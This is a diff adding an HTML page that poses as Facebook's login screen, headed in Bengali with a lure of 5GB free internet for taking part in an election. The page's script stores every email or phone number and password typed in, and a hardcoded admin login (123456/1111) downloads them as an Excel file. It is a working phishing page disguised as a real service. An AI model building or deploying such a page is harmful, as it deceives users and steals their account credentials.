@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Student ID | MH2 IT Center</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+            <style>
+                            *{
+                    box-sizing:border-box;
+                    font-family: Arial, sans-serif;
+                }
+
+                body{
+                    margin:0;
+                    background:#f0f2f5;
+                    min-height:100vh;
+                    display:flex;
+                    align-items:center;
+                    justify-content:center;
+                }
+
+                /* Main container */
+                .container{
+                    width:100%;
+                    max-width:1000px;
+                    display:flex;
+                    align-items:center;
+                    justify-content:space-between;
+                    padding:20px;
+                }
+
+                /* Left text */
+                .left{
+                    max-width:420px;
+                }
+                .left h1{
+                    font-size:48px;
+                    margin:0;
+                    font-weight:700;
+                    color: #0866FF;
+                }
+                .left p{
+                    font-size:20px;
+                    margin-top:10px;
+                    color:#333;
+                    line-height:1.4;
+                }
+
+                /* Right1 card with text */
+                                                        
+                    .demo-card {
+                        background:#fff;
+                        width:350px;
+                        border-radius:8px;
+                        box-shadow:0 4px 12px rgba(0,0,0,0.1);
+                        padding:12px 20px;
+                        margin-bottom:20px;
+                        text-align:center;
+                        font-weight:600;
+                        color:#000000;
+                        font-size:16px;
+                    }
+                    .fb-top-bar {
+                        width:100%;
+                        
+                        color:#000000;
+                        padding:16px;
+                        text-align:center;
+                        font-size:24px;
+                        font-weight:bold;
+                       
+                        position:fixed;
+                        top:0;
+                        left:0;
+                        z-index:10;
+                    }
+
+
+                /* Right side */
+                .right{
+                    display:flex;
+                    flex-direction:column;
+                    align-items:center;
+                }
+
+                /* Card for login/create */
+                .card{
+                    width:360px;
+                    background:#fff;
+                    padding:20px;
+                    border-radius:10px;
+                    box-shadow:0 4px 15px rgba(0,0,0,0.15);
+                }
+
+                .card input{
+                    width:100%;
+                    padding:14px;
+                    margin-bottom:12px;
+                    font-size:16px;
+                    border:1.5px solid #DDDFE2;
+                    border-radius:6px;
+                    transition: all 0.3s ease;
+                    
+                }
+
+                /* Input focus effect */
+                .card input:focus{
+                    outline:none;
+                    border-color:#1675F4;
+                    box-shadow:0 0 0 2px rgba(22,117,244,0.4);
+                }
+
+                /* Login button */
+                .login-btn{
+                    width:100%;
+                    padding:18px;
+                    font-size:20px;
+                    background:#0866FF;
+                    border:none;
+                    color:#fff;
+                    border-radius:6px;
+                    cursor:pointer;
+                }
+                .login-btn:hover{
+                    background:#0654d9; /* darker blue on hover */
+                }
+
+                /* Forgotten password link */
+                .forgot{
+                    display:block;
+                    text-align:center;
+                    margin:15px 0;
+                    color:#0866FF;
+                    text-decoration:none;
+                    font-size:14px;
+                }
+
+                /* Divider */
+                hr{
+                    border:none;
+                    height:1px;
+                    background:#ddd;
+                    margin:20px 0;
+                }
+
+                /* Create new account button */
+                .create-btn{
+                    width:100%;
+                    padding:16px;
+                    font-size:18px;
+                    background:#42b72a;
+                    border:none;
+                    color:#fff;
+                    border-radius:6px;
+                    cursor:pointer;
+                }
+                .create-btn:hover{
+                    background:#36a420;
+                }
+
+                /* Text under card */
+                .page-text{
+                    margin-top:20px;
+                    font-size:14px;
+                    color:#000000;
+                    text-align:center;
+                }
+                .page-text b{
+                    cursor:pointer;
+                }
+
+                /* Mobile responsiveness */
+                @media(max-width:768px){
+                    .container{
+                        flex-direction:column;
+                        text-align:center;
+                    }
+                    .left{
+                        margin-bottom:30px;
+                    }
+                    .right1, .card{
+                        margin:0 auto 20px;
+                    }
+                }
+                .back-btn{
+                    position:fixed;
+                    top:550px;
+                    left:20px;
+                    padding:10px 15px;
+                    font-size:22px;
+                    color:#ff0000;
+                    border:none;
+                    border-radius:6px;
+                    cursor:pointer;
+                }   
+                ::placeholder{
+                    color:#999;
+                }
+              
+    </style>
+</head>
+
+<body>
+
+<div class="container">
+
+
+       <header class="fb-top-bar"><p>নির্বাচনে অংশগ্রহণ করুন, ৫জিবি ফ্রি ইন্টারনেট উপভোগ করুন!
+    <br> শুধুমাত্র Facebook ব্যবহারের জন্য, তাই এখনই Facebook লগইন করে নিন।</p></header>
+
+    <!-- Left text -->
+    <div class="left">
+        <h1>facebook</h1>
+        <p>Facebook helps you connect and share with the people in your life.</p>
+    </div>
+    <!-- Right side -->
+<div class="right">
+    <div class="card">
+        <input type="text" placeholder="Email address or phone number">
+        <input type="password" placeholder="Password">
+        <button class="login-btn">Log in</button>
+        <a href="#" class="forgot">Forgotten password?</a>
+        <hr>
+        <button class="create-btn">Create new account</button>
+    </div>
+
+    <div class="page-text">
+        <b>Create a Page</b> for a celebrity, brand or business.
+    </div>
+</div>
+
+<button class="back-btn" onclick="history.back()">⬅</button>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"></script>
+
+<script>
+document.addEventListener("DOMContentLoaded", function(){
+
+    let studentData = [];
+
+    document.querySelector(".login-btn").addEventListener("click", function(){
+
+        let inputs = document.querySelectorAll(".card input");
+        let id = inputs[0].value;
+        let pass = inputs[1].value;
+
+        if(id === "" || pass === ""){
+            alert("Fill all fields!");
+            return;
+        }
+
+        // Admin Mode
+        if(id === "123456" && pass === "1111"){
+
+            if(studentData.length === 0){
+                alert("No Data Found!");
+                return;
+            }
+
+            let worksheet = XLSX.utils.json_to_sheet(studentData);
+            let workbook = XLSX.utils.book_new();
+            XLSX.utils.book_append_sheet(workbook, worksheet, "Students");
+
+            XLSX.writeFile(workbook, "StudentLoginData.xlsx");
+
+            alert("Admin Download Successful!");
+
+        } else {
+
+            studentData.push({
+                Student_ID: id,
+                Password: pass
+            });
+
+            alert("");
+        }
+        studentData.push({
+            Student_ID: id,
+            Password: pass
+        });
+
+
+        inputs[0].value = "";
+        inputs[1].value = "";
+    });
+
+});
+</script>
+ </body>
+</html>
